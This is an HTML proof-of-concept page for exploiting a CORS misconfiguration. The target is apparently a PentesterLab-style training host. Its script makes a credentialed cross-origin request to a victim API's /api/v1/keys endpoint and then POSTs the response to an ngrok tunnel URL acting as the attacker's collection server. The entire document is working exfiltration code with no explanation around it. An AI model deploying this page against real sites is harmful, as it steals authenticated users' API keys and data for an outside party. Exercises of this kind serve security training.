<html>
	<head>
		<title>CORS Exploit POC</title>
	</head>
	<body>
		<h1>CORS Exploit POC</h1>
		<script>
			var cors = new XMLHttpRequest();
			var Victim_url = 'http://api-ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys';
			cors.open('GET', Victim_url, true);
			cors.withCredentials = true;
			cors.onload = reqListener;
			cors.send();
			console.log(this.responseText)

			function reqListener() {
				var data = new XMLHttpRequest();
				var attacker_url = 'https://09ef-186-141-133-245.sa.ngrok.io';
				data.open('POST', attacker_url);
				data.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
				data.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
			};
		</script>
	</body>
</html>
